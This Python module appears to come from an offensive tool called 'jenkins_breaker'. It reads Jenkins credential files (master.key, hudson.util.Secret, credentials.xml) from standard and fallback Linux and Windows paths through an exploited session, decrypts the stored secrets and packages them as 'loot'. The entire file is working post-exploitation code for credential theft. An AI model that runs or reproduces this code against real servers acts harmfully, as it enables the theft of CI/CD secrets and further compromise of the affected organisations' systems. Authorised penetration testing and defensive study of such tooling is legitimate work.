"""Automatic credential and secret looting utilities.

Automatically grabs and decrypts Jenkins credentials during enumeration and post-exploitation.
"""

from typing import Any, Optional

from jenkins_breaker.infrastructure.file_reader import JenkinsFileReader
from jenkins_breaker.postex.jenkins_decrypt import DecryptedSecret, JenkinsDecryptor


class JenkinsCredentialGrabber:
    """Automatically grab and decrypt Jenkins credentials."""

    CREDENTIAL_FILES = {
        'master.key': '/var/jenkins_home/secrets/master.key',
        'hudson.util.Secret': '/var/jenkins_home/secrets/hudson.util.Secret',
        'credentials.xml': '/var/jenkins_home/credentials.xml',
    }

    ALT_PATHS = {
        'master.key': [
            '/var/jenkins_home/secrets/master.key',
            '/jenkins/secrets/master.key',
            '/opt/jenkins/secrets/master.key',
            'C:\\Jenkins\\secrets\\master.key',
        ],
        'hudson.util.Secret': [
            '/var/jenkins_home/secrets/hudson.util.Secret',
            '/jenkins/secrets/hudson.util.Secret',
            '/opt/jenkins/secrets/hudson.util.Secret',
            'C:\\Jenkins\\secrets\\hudson.util.Secret',
        ],
        'credentials.xml': [
            '/var/jenkins_home/credentials.xml',
            '/jenkins/credentials.xml',
            '/opt/jenkins/credentials.xml',
            'C:\\Jenkins\\credentials.xml',
        ]
    }

    def __init__(self, session: Any):
        """Initialize credential grabber.

        Args:
            session: JenkinsSession instance
        """
        self.session = session
        self.file_reader = JenkinsFileReader(session, method='auto')
        self.grabbed_files: dict[str, bytes] = {}

    def grab_credential_files(self, try_alt_paths: bool = True) -> dict[str, bytes]:
        """Attempt to grab all credential files.

        Args:
            try_alt_paths: If True, try alternative paths if standard paths fail

        Returns:
            Dictionary mapping filename to file content
        """
        results = {}

        for filename, default_path in self.CREDENTIAL_FILES.items():
            content = self.file_reader.read_file(default_path)

            if not content and try_alt_paths:
                for alt_path in self.ALT_PATHS.get(filename, []):
                    if alt_path == default_path:
                        continue
                    content = self.file_reader.read_file(alt_path)
                    if content:
                        break

            if content:
                results[filename] = content

        self.grabbed_files = results
        return results

    def can_decrypt(self) -> bool:
        """Check if we have all files needed for decryption.

        Returns:
            True if master.key and hudson.util.Secret are available
        """
        return 'master.key' in self.grabbed_files and 'hudson.util.Secret' in self.grabbed_files

    def decrypt_credentials(self) -> list[DecryptedSecret]:
        """Decrypt credentials using grabbed files.

        Returns:
            List of DecryptedSecret objects
        """
        if not self.can_decrypt():
            return []

        try:
            master_key = self.grabbed_files['master.key'].decode('utf-8').strip()
            hudson_secret = self.grabbed_files['hudson.util.Secret']

            decryptor = JenkinsDecryptor(
                master_key=master_key,
                hudson_secret=hudson_secret
            )

            secrets = []

            if 'credentials.xml' in self.grabbed_files:
                xml_content = self.grabbed_files['credentials.xml'].decode('utf-8', errors='ignore')
                secrets.extend(decryptor.decrypt_from_content(xml_content))

            return secrets

        except Exception:
            return []

    def grab_and_decrypt(self, try_alt_paths: bool = True) -> dict[str, Any]:
        """Grab files and decrypt credentials in one operation.

        Args:
            try_alt_paths: Try alternative paths if standard paths fail

        Returns:
            Dictionary with 'files' and 'secrets' keys
        """
        files = self.grab_credential_files(try_alt_paths=try_alt_paths)
        secrets = self.decrypt_credentials()

        return {
            'files': files,
            'secrets': secrets,
            'can_decrypt': self.can_decrypt(),
            'files_grabbed': len(files),
            'secrets_found': len(secrets)
        }

    def to_loot_format(self) -> dict[str, Any]:
        """Convert grabbed data to loot manager format.

        Returns:
            Dictionary suitable for LootManager.add_loot()
        """
        loot = {
            'artifacts': [],
            'credentials': []
        }

        for filename, content in self.grabbed_files.items():
            loot['artifacts'].append({
                'name': filename,
                'type': 'jenkins_credential_file',
                'content': content.decode('utf-8', errors='ignore') if isinstance(content, bytes) else content,
                'path': self.CREDENTIAL_FILES.get(filename, 'unknown'),
                'metadata': {
                    'size': len(content),
                    'purpose': 'offline_credential_decryption'
                }
            })

        secrets = self.decrypt_credentials()
        for secret in secrets:
            loot['credentials'].append({
                'type': 'jenkins_secret',
                'username': None,
                'password': secret.decrypted_value if len(secret.decrypted_value) < 100 else None,
                'key': secret.decrypted_value if len(secret.decrypted_value) >= 100 else None,
                'token': None,
                'metadata': {
                    'encrypted_value': secret.encrypted_value[:20] + '...',
                    'tag_name': secret.tag_name,
                    'source': secret.source
                }
            })

        return loot


def auto_grab_jenkins_credentials(session: Any, loot_manager: Optional[Any] = None) -> dict[str, Any]:
    """Factory function to automatically grab and loot Jenkins credentials.

    Args:
        session: JenkinsSession instance
        loot_manager: Optional LootManager instance to auto-add loot

    Returns:
        Dictionary with grab results
    """
    grabber = JenkinsCredentialGrabber(session)
    result = grabber.grab_and_decrypt(try_alt_paths=True)

    if loot_manager and (result['files_grabbed'] > 0 or result['secrets_found'] > 0):
        loot_data = grabber.to_loot_format()
        loot_manager.add_loot('auto_credential_grab', loot_data)

    return result
